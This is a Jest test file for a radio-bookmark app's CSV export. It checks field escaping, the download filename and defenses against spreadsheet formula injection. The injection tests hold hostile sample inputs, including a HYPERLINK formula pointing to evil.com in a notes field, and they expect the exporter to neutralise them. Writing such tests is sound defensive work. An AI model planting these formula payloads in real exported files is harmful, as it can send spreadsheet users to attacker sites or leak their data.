import type { Bookmark } from "../../types/bookmark";
import {
  bookmarksToCSV,
  downloadBookmarksCSV,
} from "../bookmark-import-export";

describe("bookmark-import-export", () => {
  describe("bookmarksToCSV", () => {
    it("should convert bookmarks to CSV with headers", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "Local FM Station",
          tags: ["broadcast", "fm"],
          notes: "Local radio station",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);
      const lines = csv.split("\n");

      expect(lines[0]).toBe(
        "Frequency (Hz),Name,Tags,Notes,Created At,Last Used",
      );
      expect(lines[1]).toBe(
        '100000000,Local FM Station,"broadcast,fm",Local radio station,1700000000000,1700000001000',
      );
    });

    it("should escape fields containing commas", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 146520000,
          name: "2m Simplex, Calling",
          tags: ["amateur", "vhf"],
          notes: "Test note",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);
      const lines = csv.split("\n");

      expect(lines[1]).toContain('"2m Simplex, Calling"');
    });

    it("should escape fields containing quotes", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 162550000,
          name: 'Station "Alpha"',
          tags: ["weather"],
          notes: 'Also known as "WX1"',
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);

      expect(csv).toContain('"Station ""Alpha"""');
      expect(csv).toContain('"Also known as ""WX1"""');
    });

    it("should escape fields containing newlines", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "Station",
          tags: ["test"],
          notes: "Line 1\nLine 2",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);

      expect(csv).toContain('"Line 1\nLine 2"');
    });

    it("should escape fields containing carriage returns", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "Station\rName",
          tags: ["test"],
          notes: "Note with\r\nCRLF",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);

      expect(csv).toContain('"Station\rName"');
      expect(csv).toContain('"Note with\r\nCRLF"');
    });

    it("should prevent formula injection in name field", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "=1+1",
          tags: ["test"],
          notes: "Normal note",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);

      expect(csv).toContain("'=1+1");
    });

    it("should prevent formula injection with multiple trigger characters", () => {
      const testCases = [
        { name: "=SUM(A1:A10)", expected: "'=SUM(A1:A10)" },
        { name: "+1+1", expected: "'+1+1" },
        { name: "-1", expected: "'-1" },
        { name: "@formula", expected: "'@formula" },
      ];

      testCases.forEach(({ name, expected }) => {
        const bookmarks: Bookmark[] = [
          {
            id: "bm-1",
            frequency: 100000000,
            name,
            tags: ["test"],
            notes: "Test",
            createdAt: 1700000000000,
            lastUsed: 1700000001000,
          },
        ];

        const csv = bookmarksToCSV(bookmarks);
        expect(csv).toContain(expected);
      });
    });

    it("should prevent formula injection in notes field", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "Station",
          tags: ["test"],
          notes: "=HYPERLINK('http://evil.com','Click')",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);

      expect(csv).toContain("'=HYPERLINK");
    });

    it("should handle empty bookmarks array", () => {
      const csv = bookmarksToCSV([]);

      expect(csv).toBe("Frequency (Hz),Name,Tags,Notes,Created At,Last Used");
    });

    it("should handle bookmarks with no tags", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "Station",
          tags: [],
          notes: "No tags",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);
      const lines = csv.split("\n");

      expect(lines[1]).toBe(
        "100000000,Station,,No tags,1700000000000,1700000001000",
      );
    });

    it("should handle bookmarks with empty notes", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "Station",
          tags: ["test"],
          notes: "",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);
      const lines = csv.split("\n");

      expect(lines[1]).toBe(
        "100000000,Station,test,,1700000000000,1700000001000",
      );
    });

    it("should handle multiple bookmarks", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "FM Radio",
          tags: ["fm"],
          notes: "Note 1",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
        {
          id: "bm-2",
          frequency: 162550000,
          name: "NOAA Weather",
          tags: ["weather"],
          notes: "Note 2",
          createdAt: 1700000002000,
          lastUsed: 1700000003000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);
      const lines = csv.split("\n");

      expect(lines).toHaveLength(3);
      expect(lines[0]).toBe(
        "Frequency (Hz),Name,Tags,Notes,Created At,Last Used",
      );
      expect(lines[1]).toBe(
        "100000000,FM Radio,fm,Note 1,1700000000000,1700000001000",
      );
      expect(lines[2]).toBe(
        "162550000,NOAA Weather,weather,Note 2,1700000002000,1700000003000",
      );
    });

    it("should handle complex tag combinations", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 146520000,
          name: "2m Calling",
          tags: ["amateur", "vhf", "simplex"],
          notes: "Multi-tag test",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      const csv = bookmarksToCSV(bookmarks);

      expect(csv).toContain('"amateur,vhf,simplex"');
    });
  });

  describe("downloadBookmarksCSV", () => {
    let mockAnchor: HTMLAnchorElement;
    let createObjectURLMock: jest.Mock;
    let revokeObjectURLMock: jest.Mock;

    beforeEach(() => {
      // Mock URL.createObjectURL and revokeObjectURL
      createObjectURLMock = jest.fn().mockReturnValue("blob:mock-url");
      revokeObjectURLMock = jest.fn();

      global.URL.createObjectURL = createObjectURLMock;
      global.URL.revokeObjectURL = revokeObjectURLMock;

      // Mock anchor element
      mockAnchor = {
        href: "",
        download: "",
        click: jest.fn(),
      } as unknown as HTMLAnchorElement;

      jest.spyOn(document, "createElement").mockReturnValue(mockAnchor);
      jest
        .spyOn(document.body, "appendChild")
        .mockImplementation(() => mockAnchor);
      jest
        .spyOn(document.body, "removeChild")
        .mockImplementation(() => mockAnchor);
    });

    afterEach(() => {
      jest.restoreAllMocks();
    });

    it("should create blob and trigger download", () => {
      const bookmarks: Bookmark[] = [
        {
          id: "bm-1",
          frequency: 100000000,
          name: "Test",
          tags: ["test"],
          notes: "Note",
          createdAt: 1700000000000,
          lastUsed: 1700000001000,
        },
      ];

      downloadBookmarksCSV(bookmarks);

      expect(createObjectURLMock).toHaveBeenCalled();
      expect(mockAnchor.href).toBe("blob:mock-url");
      expect(mockAnchor.download).toMatch(/^bookmarks-\d{4}-\d{2}-\d{2}\.csv$/);
      expect(mockAnchor.click).toHaveBeenCalled();
      expect(document.body.appendChild).toHaveBeenCalledWith(mockAnchor);
      expect(document.body.removeChild).toHaveBeenCalledWith(mockAnchor);
      expect(revokeObjectURLMock).toHaveBeenCalledWith("blob:mock-url");
    });

    it("should generate filename with current date", () => {
      const bookmarks: Bookmark[] = [];

      jest.useFakeTimers();
      jest.setSystemTime(new Date("2025-11-18T12:00:00Z"));

      downloadBookmarksCSV(bookmarks);

      expect(mockAnchor.download).toBe("bookmarks-2025-11-18.csv");

      jest.useRealTimers();
    });

    it("should handle empty bookmarks array", () => {
      downloadBookmarksCSV([]);

      expect(createObjectURLMock).toHaveBeenCalled();
      expect(mockAnchor.click).toHaveBeenCalled();
    });
  });
});
